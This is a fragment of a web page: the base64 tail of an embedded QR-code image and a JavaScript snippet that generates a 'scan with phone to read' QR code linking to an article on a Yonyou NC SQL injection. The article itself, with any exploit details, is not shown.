Jrj9og7ZFozoOWHUIVx/v+W6hvgwYnlVvQ+S63plq9RFSB6OaKZjzanqOmRG1+UQH4LqNatKDvFhRP0Vwmf++oSsntKL9OW/wvU89QbMqvty0R65CHkbVtw+SA6C5vVnaEY0I4fMUoeRq6/y6j2nLnZf/ghenxCf4pvgthDI2wJBzwfhMOKZD8mbE31L5I+ifZC5cEQzZzMhveYhvPfpq8thnjcHow+PceD6jeHtzb62T4jn8i044+bEnlfvaE5c+ermIG+Zuqi/Rz1IDwTVRXvkkByMaE4033nXuw+Zqz7Dw0JmoUv7uSewLaRvd8Vh3DKEm4fw1bcAcx/munNX876iw/fuBfN+mOv9jPe+p20hvenir3kCh9+pewzItiGo3re74jD2rfrVRUgfBNX7fbpePqQHgmY6VrYKkoMRy9uX/ZCcHoRDUN28HOKrixDdXOH1CfHpvAkeFgLZ2up8EB+C5iAcguodIT4E9evtqFpxGPMwcvvuIcx76r5V93rLq0wVZE5d7wuiV7YKRm62vKrOSzsspMSrXvcEtoW4rRV6RH05jG+BujmID0F10TyMPoTrixC995evJpZW1TlkRnn7WuUgeQiag/D9jNn1M/ltIbNBl/bzT2D7015vDePWYc7dun2dQ/q6bl6EMQfhK199hjD2em8YdXu7D/dz9kFyvV8u9vyKqxden5B6Cm9Uh9+HuF3IW9DP2n15z3W+yqnDc/eDMd/vVxyS8R6lVclh9Fc6PJar2bNy7swrDTIfuP609/ZmX0//IwuyTbcO4X5f6nIY/ZVuX0dIv7r9M+yZFYfMdAaM3D4YdfMdITkYsc+R2w/Jqxc+vRCHXfhvnsDpT1n9trXFqq7L4bj1ykN0c6VVyWH01UWID8HqrdIvhHgQLG1fEL36ZrXP1nXPQPohWJmqnpPDmIOR9xxw/Rpye7Ov7acsz+XWOkK2CyOas/8MIf2rHMSHYM95P4gPn2i2Z7ouF+FzBqyvzYveR95Rf4WQe+3969eQ/hRfzA8LgWwNgp5vv8W6Vod5Dkbd/KNY96ha5cur2vvFq9TqukoO45lg5JWtMl/X+1J/FmG8D4x8P++wkL15Xf/8Ezj8lOURfDPkIqy3a2aPkLzzRDNw3zdnHyQPQf1CiAYjlve1Grs8g6gL4/1g5OZE+0X4zF+fEJ/Sm+D2U5bbElfn0xcfzcHnWwAc2oCP/6wMRjwE/wjef4Z/Itv/OAAy02z31WHMQTgE7YNwCKo7p6M+JA9B9T1en5D903iD6+3XEMjW4DFcnR3S333fGnUYc92Xi/Z1hMwBurV94pwBbBp8Xh8a/wj2/aEbqIub8ecCMvsPPYB9cMxdn5DD43qtsC3ErZ1hP655GLcNI7fPfOcwz8Nc7/01V00srQoyo66rVr46JC8XYa7ri3WPKvkzuC3kmaYr+++ewGEhkLcARnz0CPVmVJmHzJGLlalacUhfZarMiRAfjmimIyRb86r063pWMObNQHT7RYgOI+o/goeFPNJ0Zf7dE/j2QiBvw+rtUT/7FiBzzK36ui4vfLYXxnvCyJ0H0SFY96rSr+t71XMrXvq3F1JDrvp7T+CvLQTGt8c3BqL3I8Nc730wzzkP4gNKpwh8/H7Ee9kgh/jqor78DGE+p/c5t/CvLaTf5OJfewKHhdSWZrUab1Yfnnsr7HMOzPthrtu3R0gWgt6jI8SHoL6z5B0heRix51Yc0jfzDwuZhS7t557AthDI1uA+ro7W3yrIHPMw8jNdv89VFyFz4RP17BW7vuLqHSH36Hqf3305jP0QDp+4LcSmC1/7BK6FvPb5H+7+PwAAAP//+BP+yAAAAAZJREFUAwCkXtfL0IauZgAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-ActivityNotice-doSingUp-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 